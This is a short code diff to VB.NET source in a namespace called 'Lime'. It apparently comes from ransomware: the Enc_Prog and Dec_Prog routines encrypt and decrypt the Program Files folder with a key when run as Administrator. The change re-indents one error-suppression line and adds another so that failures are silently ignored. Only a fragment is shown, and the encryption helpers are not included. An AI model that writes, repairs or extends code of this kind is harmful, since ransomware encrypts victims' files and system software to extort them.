@@ -83,7 +83,7 @@ Namespace Lime
         End Sub
 
         Public Sub Enc_Prog(ByVal password As String)
-    On Error Resume Next
+            On Error Resume Next
             If ID.AmiAdmin = "Administrator" Then
                 Dir_En(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", key)
             End If
@@ -285,6 +285,7 @@ Namespace Lime
         End Sub
 
         Public Sub Dec_Prog(ByVal password As String)
+            On Error Resume Next
             If ID.AmiAdmin = "Administrator" Then
                 Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
             End If
